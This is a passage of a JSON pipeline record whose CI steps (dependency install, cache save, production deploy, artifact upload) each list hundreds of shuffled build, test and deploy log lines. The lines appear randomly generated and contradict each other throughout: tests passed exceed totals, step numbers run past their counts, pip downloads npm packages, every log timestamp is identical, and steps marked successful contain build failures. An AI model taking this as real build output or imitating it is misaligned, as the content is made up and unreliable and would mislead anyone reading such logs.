          "WARNING: eslint has known vulnerabilities",
          "[12:46:43] DEBUG: Loading configuration",
          "WARNING: express has known vulnerabilities",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Cache hit for key-9299",
          "Pulling image: node:18",
          "Step 6/23: Running migrations",
          "[12:46:43] DEBUG: Connection pool: 5 active",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:43] WARN: Deprecated API usage",
          "npm install: added 31 packages",
          "[12:46:43] INFO: Starting build process",
          "[12:46:43] INFO: Cache refreshed",
          "npm install: resolved 140 packages",
          "[12:46:43] DEBUG: Loading configuration",
          "  PASS: unit/test_user_create.spec.js",
          "Time: 72.999s",
          "Waiting...",
          "[12:46:43] DEBUG: Query executed in 18ms",
          "Time: 27.879s",
          "Generating source maps...",
          "Finished.",
          "[12:46:43] INFO: Connecting to database",
          "TLS handshake completed",
          "Installing eslint@2.2.7",
          "Step 5/18: Building",
          "OK",
          "Compiling lib/main.py...",
          "Compiling lib/main.py...",
          "Pulling image: node:latest",
          "HEAD is now at f6bb2da",
          "Test Suites: 17 passed, 39 total",
          "Step 10/17: Running migrations",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Node.js 20.0.5",
          "Completed.",
          "npm notice: created a lockfile",
          "Step 6/19: Testing",
          "[12:46:43] DEBUG: Memory usage: 769MB",
          "OK",
          "Snapshots: 48 passed, 14 total",
          "Generating source maps...",
          "[12:46:43] DEBUG: Initializing service",
          "pip: Downloading jest-1.14.tar.gz",
          "pip: Downloading eslint-5.12.tar.gz",
          "  PASS: test_api_health (276ms)",
          "Processing...",
          "Verifying...",
          "WARNING: webpack has known vulnerabilities",
          "Exception: ValueError",
          "Using Python 3.10",
          "Image pulled successfully",
          "[12:46:43] DEBUG: Memory usage: 113MB",
          "OK",
          "Step 2/15: Building",
          "[12:46:43] DEBUG: Initializing service",
          "[12:46:43] INFO: Processing request",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Ready.",
          "Connection established",
          "Done.",
          "Switched to branch 'bugfix/task-418'",
          "POST /api - 201 (46ms)",
          "[12:46:43] WARN: Deprecated API usage",
          "Coverage: 84% statements, 100% branches",
          "Optimizing 77 modules...",
          "Cache miss for key-3879",
          "Checking out develop branch",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2717 build failed with exit code 76",
          "\u2713 deploy completed",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 24",
          "Ready.",
          "Cache invalidated: node_modules",
          "Compiling utils/handler.rs...",
          "Coverage: 72% statements, 74% branches",
          "pip: Installing build dependencies...",
          "[12:46:43] INFO: Cache refreshed",
          "pip: Collecting webpack",
          "Fetching from https://gcr.io/package.json",
          "Creating production build...",
          "pip: Downloading lodash-5.2.tar.gz",
          "Pushing to registry...",
          "[12:46:43] DEBUG: Connection pool: 5 active",
          "Using Node.js 18.12.6",
          "[12:46:43] DEBUG: Initializing service",
          "Finished.",
          "Installing react@2.4.0",
          "Waiting...",
          "Optimizing 85 modules...",
          "Step 2/25: Testing",
          "Success!",
          "Optimizing 12 modules...",
          "Compiling lib/service.java...",
          "Exception: RuntimeError",
          "Pulling image: alpine:18",
          "[12:46:43] WARN: Deprecated API usage",
          "Finished.",
          "WARNING: react has known vulnerabilities",
          "Compiling lib/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Processing...",
          "\u2713 All checks passed",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Loading configuration",
          "Cache restored successfully (499MB)",
          "Using Python 3.9",
          "  PASS: unit/test_db_connect.spec.js",
          "TLS handshake completed",
          "Compiling utils/app.ts...",
          "Verifying...",
          "[12:46:43] WARN: Deprecated API usage",
          "Finished.",
          "Compiling lib/index.js...",
          "Using Python 3.12",
          "Snapshots: 40 passed, 48 total",
          "FAILED: test_cache_hit",
          "Step 3/19: Linting",
          "\u2713 Task completed in 1656ms",
          "Tests: 269 passed, 179 total",
          "Finished.",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading webpack-3.9.tar.gz",
          "Cache miss for key-9099",
          "  PASS: unit/test_cache_hit.spec.js",
          "Tests: 363 passed, 313 total",
          "Compiling utils/handler.rs...",
          "Using Python 3.9",
          "Verifying...",
          "Waiting...",
          "Step 20/22: Testing",
          "Transforming 376 files...",
          "npm notice: package.json updated",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] INFO: Cache refreshed",
          "Using Python 3.10",
          "Coverage: 74% statements, 84% branches",
          "Waiting...",
          "pip: Collecting express",
          "[12:46:43] DEBUG: Connection pool: 4 active",
          "Cache miss for key-1633",
          "WARNING: axios has known vulnerabilities",
          "npm install: resolved 1110 packages",
          "pip install: Successfully installed prettier-2.6",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Memory usage: 1176MB",
          "Done.",
          "POST /data - 202 (234ms)",
          "Optimizing 34 modules...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "Compiling components/index.js...",
          "Building Docker image...",
          "Tests: 407 passed, 170 total",
          "Waiting...",
          "Artifact downloaded: 50MB",
          "Snapshots: 46 passed, 41 total",
          "WARNING: jest has known vulnerabilities",
          "Pulling image: alpine:3.11",
          "pip: Downloading webpack-1.0.tar.gz",
          "[12:46:43] WARN: Deprecated API usage",
          "Bundling main.css",
          "Using Node.js 15.16.5",
          "Layer 5/10: COPY command",
          "Snapshots: 39 passed, 15 total",
          "Time: 50.921s",
          "Finished.",
          "Ran 191 tests in 59s",
          "Minifying main.js",
          "[12:46:43] INFO: Starting build process",
          "Environment: test",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:43] INFO: Request completed",
          "Step 15/15: Building",
          "\u2713 package completed",
          "Tests: 141 passed, 480 total",
          "HEAD is now at c673203",
          "[12:46:43] INFO: Connecting to database",
          "Coverage: 90% statements, 66% branches",
          "npm install: added 165 packages",
          "[12:46:43] INFO: Connecting to database",
          "[12:46:43] INFO: Connecting to database",
          "Step 15/16: Testing",
          "Compiling lib/app.ts...",
          "HEAD is now at 6eaa035",
          "Transforming 922 files...",
          "HEAD is now at f7c4204",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing axios@5.11.6",
          "[12:46:43] ERROR: Connection failed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:48:37.684444",
        "finished_at": "2025-11-26T12:48:42.941951",
        "log_lines": [
          "=== Step: save_cache ===",
          "Optimizing 69 modules...",
          "Cache hit for key-6832",
          "  PASS: test_cache_hit (78ms)",
          "Coverage: 97% statements, 82% branches",
          "Step 3/25: Deploying",
          "[12:46:43] INFO: Cache refreshed",
          "Step 2/18: Deploying",
          "Ran 104 tests in 21s",
          "Pulling image: node:latest",
          "TLS handshake completed",
          "Connection established",
          "[12:46:43] DEBUG: Loading configuration",
          "Finished.",
          "Bundling styles.js",
          "Artifact uploaded: dist.zip (93MB)",
          "Verifying...",
          "Creating production build...",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "pip: Collecting webpack",
          "Done.",
          "[12:46:43] DEBUG: Query executed in 47ms",
          "Artifact downloaded: 28MB",
          "[12:46:43] DEBUG: Initializing service",
          "Verifying...",
          "Fetching from https://registry.npmjs.org/package.json",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:46:43] DEBUG: Query executed in 93ms",
          "yarn add: Done in 28.91s",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "\u2717 build failed with exit code 86",
          "  PASS: unit/test_auth_login.spec.js",
          "Platform: linux-x64",
          "Using Python 3.11",
          "Compiling lib/service.java...",
          "\u2713 Task completed in 4801ms",
          "[12:46:43] INFO: Request completed",
          "Tests: 475 passed, 295 total",
          "Snapshots: 19 passed, 50 total",
          "Artifact uploaded: dist.zip (12MB)",
          "[12:46:43] INFO: Request completed",
          "Image pulled successfully",
          "Minifying app.js",
          "Completed.",
          "Cache invalidated: build",
          "Image pulled successfully",
          "Test Suites: 30 passed, 33 total",
          "pip: Installing build dependencies...",
          "pip: Downloading react-1.9.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-9448",
          "npm install: resolved 914 packages",
          "Using Python 3.12",
          "Compiling utils/index.js...",
          "Transforming 803 files...",
          "\u2713 Task completed in 2828ms",
          "Snapshots: 0 passed, 29 total",
          "Checking out master branch",
          "Step 8/17: Installing dependencies",
          "\u2713 deploy completed",
          "Coverage: 83% statements, 99% branches",
          "\u2713 lint completed",
          "Step 10/23: Building",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 5aa527d",
          "Uploading artifact 'coverage' (13 files)",
          "[12:46:43] DEBUG: Loading configuration",
          "Pulling image: python:18",
          "[12:46:43] DEBUG: Initializing service",
          "pip: Collecting webpack",
          "NODE_ENV=production",
          "Layer 4/13: RUN command",
          "Building Docker image...",
          "HEAD is now at 9fba978",
          "Minifying vendor.js",
          "WARNING: axios has known vulnerabilities",
          "[12:46:43] WARN: Deprecated API usage",
          "Completed.",
          "Coverage: 99% statements, 97% branches",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Ran 48 tests in 56s",
          "Artifact uploaded: build.tar.gz (9MB)",
          "npm install: resolved 1580 packages",
          "Cache invalidated: build",
          "Compiling src/handler.rs...",
          "Platform: linux-x64",
          "Step 7/25: Deploying",
          "\u2713 All checks passed",
          "  PASS: e2e/test_db_connect.spec.js",
          "Cache restored successfully (481MB)",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "npm install: resolved 1269 packages",
          "[12:46:43] DEBUG: Connection pool: 11 active",
          "Fetching submodules...",
          "pip: Downloading eslint-3.7.tar.gz",
          "Compiling components/handler.rs...",
          "Creating production build...",
          "Using Python 3.11",
          "Verifying...",
          "\u2713 Step 'test' succeeded",
          "Transforming 622 files...",
          "Loading...",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Processing...",
          "Minifying main.js",
          "GET /status - 200 (85ms)",
          "Test Suites: 36 passed, 11 total",
          "Step 7/19: Installing dependencies",
          "Uploading artifact 'coverage' (5 files)",
          "Step 1/22: Running migrations",
          "Installing webpack@4.3.0",
          "Artifact downloaded: 10MB",
          "npm install: resolved 1798 packages",
          "Ran 178 tests in 46s",
          "Image pulled successfully",
          "[12:46:43] DEBUG: Query executed in 75ms",
          "[12:46:43] INFO: Cache refreshed",
          "\u2713 build completed",
          "Uploading artifact 'dist' (35 files)",
          "pip: Installing build dependencies...",
          "Done.",
          "Installing prettier@3.1.1",
          "Cache saved successfully",
          "[12:46:43] INFO: Connecting to database",
          "Connection established",
          "[12:46:43] WARN: Deprecated API usage",
          "Test Suites: 19 passed, 38 total",
          "Fetching submodules...",
          "Step 1/25: Testing",
          "POST /api - 201 (368ms)",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "Cache saved successfully",
          "npm install: resolved 1627 packages",
          "pip: Downloading webpack-4.1.tar.gz",
          "Using Node.js 16.8.6",
          "Step 19/25: Linting",
          "Fetching submodules...",
          "[12:46:43] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:46:43] INFO: Connecting to database",
          "npm install: resolved 1484 packages",
          "Connection established",
          "Using Node.js 20.9.6",
          "Pulling image: python:latest",
          "Uploading artifact 'build' (10 files)",
          "Cache saved successfully",
          "yarn add: Done in 30.10s",
          "WARNING: eslint has known vulnerabilities",
          "Using Node.js 20.0.3",
          "  PASS: e2e/test_api_health.spec.js",
          "Fetching from https://docker.io/package.json",
          "Pushing to registry...",
          "NODE_ENV=test",
          "\u2713 validate completed",
          "POST /api - 201 (216ms)",
          "OK",
          "Time: 106.759s",
          "Image pulled successfully",
          "Snapshots: 22 passed, 2 total",
          "OK",
          "Already up to date.",
          "\u2713 Step 'install' succeeded",
          "Cache saved successfully",
          "WARNING: express has known vulnerabilities",
          "Exception: RuntimeError",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 58",
          "OK",
          "Fetching submodules...",
          "[12:46:43] INFO: Starting build process",
          "Installing express@5.2.3",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "[12:46:43] ERROR: Connection failed",
          "pip: Collecting prettier",
          "Platform: linux-x64",
          "[12:46:43] DEBUG: Connection pool: 14 active",
          "\u2713 lint completed",
          "Step 1/15: Installing dependencies",
          "pip: Downloading webpack-2.13.tar.gz",
          "WARNING: axios has known vulnerabilities",
          "Step 8/19: Deploying",
          "Cache miss for key-1067",
          "Building Docker image...",
          "HEAD is now at be20df7",
          "Coverage: 75% statements, 81% branches",
          "pip: Collecting jest",
          "Artifact uploaded: dist.zip (27MB)",
          "Ready.",
          "Step 6/21: Installing dependencies",
          "Step 4/24: Building",
          "Building Docker image...",
          "Step 19/18: Linting",
          "Completed.",
          "[12:46:43] DEBUG: Memory usage: 1170MB",
          "Bundling styles.js",
          "POST /api - 200 (68ms)",
          "\u2713 Task completed in 4128ms",
          "HEAD is now at fb85d61",
          "[12:46:43] INFO: Starting build process",
          "Building Docker image...",
          "Using Python 3.11",
          "Creating production build...",
          "Finished.",
          "Ran 59 tests in 42s",
          "Step 8/21: Installing dependencies",
          "Cache miss for key-6063",
          "Step 9/21: Building",
          "Cache saved successfully",
          "Step 9/15: Testing",
          "npm notice: package.json updated",
          "yarn add: Done in 2.61s",
          "pip: Collecting webpack",
          "NODE_ENV=production",
          "Cache invalidated: dependencies",
          "Layer 1/9: ENV command",
          "pip: Downloading prettier-4.12.tar.gz",
          "Finished.",
          "Step 17/25: Running migrations",
          "Image pulled successfully",
          "Step 17/19: Building",
          "[12:46:43] DEBUG: Memory usage: 1879MB",
          "Using Node.js 17.18.7",
          "Compiling lib/utils.go...",
          "npm install: added 383 packages",
          "Verifying...",
          "Exception: ValueError",
          "Optimizing 77 modules...",
          "Cache hit for key-8025",
          "Cache saved successfully",
          "Coverage: 80% statements, 97% branches",
          "Finished.",
          "npm install: added 153 packages",
          "Layer 9/11: COPY command",
          "Compiling src/handler.rs...",
          "Exception: NullPointerException",
          "\u2713 Task completed in 2021ms",
          "Done.",
          "Connection established",
          "Already up to date.",
          "[12:46:43] INFO: Processing request",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:48:42.941951",
        "finished_at": "2025-11-26T12:48:46.446956",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Time: 104.426s",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Image pulled successfully",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Memory usage: 234MB",
          "Cache miss for key-6554",
          "[12:46:43] DEBUG: Loading configuration",
          "Time: 22.874s",
          "npm notice: package.json updated",
          "Ran 86 tests in 50s",
          "HEAD is now at c62a2b4",
          "Minifying app.js",
          "Pulling image: python:18",
          "Uploading artifact 'coverage' (23 files)",
          "[12:46:43] INFO: Connecting to database",
          "Step 17/20: Deploying",
          "Cache hit for key-1944",
          "TLS handshake completed",
          "[12:46:43] DEBUG: Loading configuration",
          "Environment: test",
          "Snapshots: 28 passed, 46 total",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:46:43] WARN: Deprecated API usage",
          "GET /api - 200 (40ms)",
          "POST /data - 202 (29ms)",
          "Time: 83.90s",
          "[12:46:43] WARN: Deprecated API usage",
          "Done.",
          "Compiling components/utils.go...",
          "Step 15/15: Testing",
          "OK",
          "Verifying...",
          "GET /api - 201 (76ms)",
          "pip install: Successfully installed react-4.14",
          "Using Node.js 18.15.1",
          "[12:46:43] INFO: Connecting to database",
          "Environment: test",
          "Time: 33.756s",
          "Using Python 3.11",
          "Exception: NullPointerException",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (87MB)",
          "POST /data - 200 (402ms)",
          "Tests: 127 passed, 284 total",
          "Cache miss for key-5141",
          "Success!",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "Building Docker image...",
          "Artifact downloaded: 18MB",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Verifying...",
          "Artifact uploaded: dist.zip (65MB)",
          "Ready.",
          "Ran 177 tests in 58s",
          "Platform: win32-x64",
          "Cache saved successfully",
          "[12:46:43] DEBUG: Loading configuration",
          "Building Docker image...",
          "Bundling styles.css",
          "Artifact uploaded: dist.zip (80MB)",
          "Switched to branch 'hotfix/task-702'",
          "[12:46:43] WARN: Deprecated API usage",
          "Using Node.js 14.11.0",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Test Suites: 48 passed, 39 total",
          "[12:46:43] ERROR: Connection failed",
          "Step 15/23: Building",
          "Uploading artifact 'dist' (21 files)",
          "Snapshots: 41 passed, 37 total",
          "Image pulled successfully",
          "[12:46:43] ERROR: Connection failed",
          "yarn add: Done in 8.46s",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "Step 6/17: Building",
          "Installing prettier@2.13.8",
          "Loading...",
          "npm notice: package.json updated",
          "Bundling runtime.js",
          "Fetching submodules...",
          "Layer 9/15: ENV command",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] ERROR: Connection failed",
          "Switched to branch 'hotfix/task-778'",
          "yarn add: Done in 3.52s",
          "Optimizing 31 modules...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling utils/handler.rs...",
          "Switched to branch 'bugfix/task-105'",
          "[12:46:43] INFO: Starting build process",
          "Bundling vendor.js",
          "pip: Downloading webpack-5.8.tar.gz",
          "Pulling image: alpine:18",
          "Step 9/21: Installing dependencies",
          "Bundling main.js",
          "Pushing to registry...",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "Compiling components/service.java...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Ready.",
          "npm install: added 41 packages",
          "[12:46:43] INFO: Connecting to database",
          "Verifying...",
          "Environment: production",
          "NODE_ENV=test",
          "Fetching from https://githubusercontent.com/package.json",
          "pip install: Successfully installed react-5.1",
          "FAILED: test_cache_hit",
          "GET /api - 204 (86ms)",
          "Cache miss for key-9382",
          "\u2713 All checks passed",
          "[12:46:43] INFO: Request completed",
          "Pulling image: node:18",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] INFO: Cache refreshed",
          "Fetching from https://pypi.org/package.json",
          "Pushing to registry...",
          "[12:46:43] DEBUG: Connection pool: 7 active",
          "TLS handshake completed",
          "Connection established",
          "Finished.",
          "Switched to branch 'feature/task-799'",
          "Already up to date.",
          "Already up to date.",
          "Transforming 243 files...",
          "Processing...",
          "[12:46:43] WARN: Deprecated API usage",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "npm install: added 347 packages",
          "pip: Collecting jest",
          "Cache invalidated: dependencies",
          "Compiling lib/service.java...",
          "Completed.",
          "Step 8/23: Testing",
          "npm install: added 48 packages",
          "HEAD is now at e2bc8de",
          "WARNING: eslint has known vulnerabilities",
          "Time: 42.187s",
          "npm install: resolved 760 packages",
          "[12:46:43] DEBUG: Loading configuration",
          "Done.",
          "\u2717 build failed with exit code 98",
          "Finished.",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:46:43] INFO: Starting build process",
          "[12:46:43] DEBUG: Memory usage: 1387MB",
          "Completed.",
          "Bundling main.css",
          "[12:46:43] WARN: Deprecated API usage",
          "Layer 10/10: RUN command",
          "[12:46:43] ERROR: Connection failed",
          "Pulling image: python:18",
          "Exception: ValueError",
          "Tests: 317 passed, 157 total",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "  PASS: test_user_create (383ms)",
          "Cache saved successfully",
          "Using Node.js 16.8.9",
          "pip: Installing build dependencies...",
          "Tests: 477 passed, 416 total",
          "pip install: Successfully installed react-1.1",
          "  PASS: integration/test_api_health.spec.js",
          "Cache miss for key-6003",
          "Pulling image: node:3.11",
          "Completed.",
          "pip: Collecting eslint",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Cache saved successfully",
          "Bundling styles.css",
          "Using Node.js 15.2.5",
          "Cache miss for key-5972",
          "[12:46:43] DEBUG: Query executed in 82ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Tests: 199 passed, 362 total",
          "[12:46:43] INFO: Starting build process",
          "Creating production build...",
          "Tests: 67 passed, 69 total",
          "Compiling lib/service.java...",
          "Success!",
          "[12:46:43] DEBUG: Query executed in 79ms",
          "Compiling lib/main.py...",
          "Ready.",
          "Cache hit for key-8123",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] DEBUG: Query executed in 95ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:43] DEBUG: Memory usage: 708MB",
          "yarn add: Done in 23.52s",
          "[12:46:43] ERROR: Connection failed",
          "Verifying...",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Step 12/22: Linting",
          "Using Node.js 19.19.7",
          "Minifying app.js",
          "Cache miss for key-9092",
          "Checking out develop branch",
          "\u2713 Step 'checkout' succeeded",
          "Fetching submodules...",
          "[12:46:43] DEBUG: Memory usage: 1770MB",
          "[12:46:43] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "Using Node.js 15.16.9",
          "Installing axios@3.19.4",
          "[12:46:43] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-843'",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:43] INFO: Starting build process",
          "Step 6/24: Building",
          "Building Docker image...",
          "[12:46:43] ERROR: Connection failed",
          "Cache restored successfully (349MB)",
          "Checking out main branch",
          "Cache saved successfully",
          "\u2713 Step 'install' succeeded",
          "Tests: 412 passed, 462 total",
          "npm notice: package.json updated",
          "Step 18/17: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "Step 3/20: Installing dependencies",
          "Compiling utils/utils.go...",
          "Test Suites: 28 passed, 23 total",
          "Building Docker image...",
          "\u2713 All checks passed",
          "\u2713 Task completed in 2002ms",
          "Environment: staging",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'coverage' (18 files)",
          "Compiling lib/handler.rs...",
          "[12:46:43] INFO: Cache refreshed",
          "Snapshots: 32 passed, 40 total",
          "Done.",
          "[12:46:43] INFO: Processing request",
          "npm notice: created a lockfile",
          "npm install: added 49 packages",
          "npm notice: package.json updated",
          "Cache miss for key-4940",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Layer 8/8: ENV command",
          "Switched to branch 'hotfix/task-638'",
          "yarn add: Done in 23.67s",
          "Cache restored successfully (45MB)",
          "Compiling utils/app.ts...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:48:46.446956",
        "finished_at": "2025-11-26T12:48:55.209467",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache saved successfully",
          "Environment: development",
          "Completed.",
          "Cache miss for key-5638",
          "[12:46:43] WARN: Deprecated API usage",
          "[12:46:43] INFO: Request completed",
          "Minifying vendor.js",
          "Artifact downloaded: 26MB",
          "yarn add: Done in 25.72s",
          "\u2717 build failed with exit code 14",
          "[12:46:43] INFO: Connecting to database",
          "Compiling components/index.js...",
          "[12:46:43] DEBUG: Loading configuration",
          "Cache miss for key-9385",
          "Compiling utils/index.js...",
          "Step 1/19: Installing dependencies",
          "Pulling image: python:18",
          "\u2713 Step 'setup' succeeded",
          "Step 10/22: Building",
          "GET /status - 204 (3ms)",
          "Step 9/25: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "Step 1/19: Testing",
          "Artifact uploaded: dist.zip (64MB)",
          "Building Docker image...",
          "Layer 7/10: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: linux-x64",
          "Using Node.js 14.5.5",
          "Step 17/16: Linting",
          "pip: Installing build dependencies...",
          "Tests: 424 passed, 487 total",
          "Bundling styles.js",
          "Step 3/22: Testing",
          "Uploading artifact 'coverage' (30 files)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Success!",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:46:43] INFO: Cache refreshed",
          "POST /data - 201 (132ms)",
          "Ran 30 tests in 16s",
          "Compiling src/index.js...",
          "Ready.",
          "Cache hit for key-4414",
          "Time: 114.552s",
          "[12:46:43] DEBUG: Query executed in 97ms",
          "[12:46:43] DEBUG: Connection pool: 8 active",
          "GET /api - 204 (95ms)",
          "TLS handshake completed",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 13/22: Testing",
          "Pulling image: node:18",
          "npm install: resolved 710 packages",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at 7436058",
          "Fetching submodules...",
          "Done.",
          "pip: Downloading lodash-1.16.tar.gz",
          "Pushing to registry...",
          "HEAD is now at 1239a52",
          "Test Suites: 9 passed, 12 total",
          "[12:46:43] INFO: Connecting to database",
          "[12:46:43] DEBUG: Loading configuration",
          "Optimizing 97 modules...",
          "Installing react@4.18.4",
          "[12:46:43] DEBUG: Loading configuration",
          "[12:46:43] DEBUG: Query executed in 35ms",
          "Artifact downloaded: 29MB",
          "  PASS: test_cache_hit (406ms)",
          "GET /health - 200 (24ms)",
          "Step 16/15: Testing",
          "Layer 6/13: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "npm install: added 474 packages",
          "Snapshots: 12 passed, 46 total",
          "Ran 126 tests in 57s",
          "Transforming 675 files...",
          "[12:46:43] INFO: Processing request",
          "Layer 5/14: COPY command",
          "Completed.",
          "Step 13/19: Linting",
          "Transforming 455 files...",
          "Platform: win32-x64",
          "Coverage: 89% statements, 83% branches",
          "Time: 18.898s",
          "Cache miss for key-5208",
          "\u2713 Task completed in 1377ms",
          "NODE_ENV=development",
          "Image pulled successfully",
          "Optimizing 63 modules...",
          "Compiling src/utils.go...",
          "Switched to branch 'feature/task-954'",
          "\u2713 Step 'test' succeeded",
          "Cache restored successfully (353MB)",
          "Ready.",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "Exception: RuntimeError",
          "Connection established",
          "Success!",
          "FAILED: test_user_create",
          "Installing prettier@4.11.3",
          "Artifact downloaded: 50MB",
          "Artifact uploaded: dist.zip (17MB)",
          "[12:46:43] DEBUG: Initializing service",
          "[12:46:43] INFO: Starting build process",
          "Compiling src/handler.rs...",
          "\u2717 build failed with exit code 53",
          "Checking out develop branch",
          "pip: Installing build dependencies...",
          "Installing axios@1.1.9",
          "npm install: resolved 1656 packages",
          "Platform: darwin-arm64",
          "OK",
          "npm install: resolved 1451 packages",
          "Artifact downloaded: 22MB",
          "Step 5/15: Running migrations",
          "Bundling main.js",
          "POST /data - 201 (327ms)",
          "Cache hit for key-5490",
          "Test Suites: 47 passed, 28 total",
          "pip: Collecting lodash",
          "pip: Collecting jest",
          "[12:46:43] INFO: Cache refreshed",
          "Snapshots: 27 passed, 0 total",
          "[12:46:43] INFO: Processing request",
          "Installing prettier@3.4.9",
          "Compiling components/service.java...",
          "Waiting...",
          "[12:46:43] DEBUG: Memory usage: 1540MB",
          "\u2717 build failed with exit code 88",
          "GET /api - 201 (33ms)",
          "Cache miss for key-1194",
          "Building Docker image...",
          "Using Node.js 14.19.4",
          "[12:46:43] DEBUG: Connection pool: 14 active",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "Cache invalidated: dependencies",
          "[12:46:43] DEBUG: Memory usage: 1548MB",
          "Already up to date.",
          "Uploading artifact 'coverage' (25 files)",
          "Minifying main.js",
          "TLS handshake completed",
          "Pushing to registry...",
          "Platform: win32-x64",
          "[12:46:43] INFO: Starting build process",
          "[12:46:43] INFO: Cache refreshed",
          "Success!",
          "Compiling src/app.ts...",
          "[12:46:43] INFO: Starting build process",
          "Already up to date.",
          "[12:46:43] INFO: Cache refreshed",
          "yarn add: Done in 27.13s",
          "\u2713 All checks passed",
          "  PASS: e2e/test_user_create.spec.js",
          "Checking out develop branch",
          "Processing...",
          "Compiling components/utils.go...",
          "Cache invalidated: dependencies",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "npm install: added 54 packages",
          "Cache invalidated: dependencies",
          "\u2713 Step 'test' succeeded",
          "Done.",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache saved successfully",
          "Fetching submodules...",
          "npm install: resolved 412 packages",
          "Building Docker image...",
          "Snapshots: 2 passed, 8 total",
          "Cache saved successfully",
          "[12:46:43] INFO: Processing request",
          "Cache invalidated: build",
          "[12:46:43] INFO: Cache refreshed",
          "Environment: production",
          "Coverage: 84% statements, 89% branches",
          "Step 17/22: Installing dependencies",
          "Fetching submodules...",
          "[12:46:43] INFO: Processing request",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 1166ms",
          "Pushing to registry...",
          "  PASS: test_cache_hit (40ms)",
          "pip: Collecting jest",
          "Processing...",
          "\u2713 All checks passed",
          "Exception: RuntimeError",
          "Snapshots: 29 passed, 14 total",
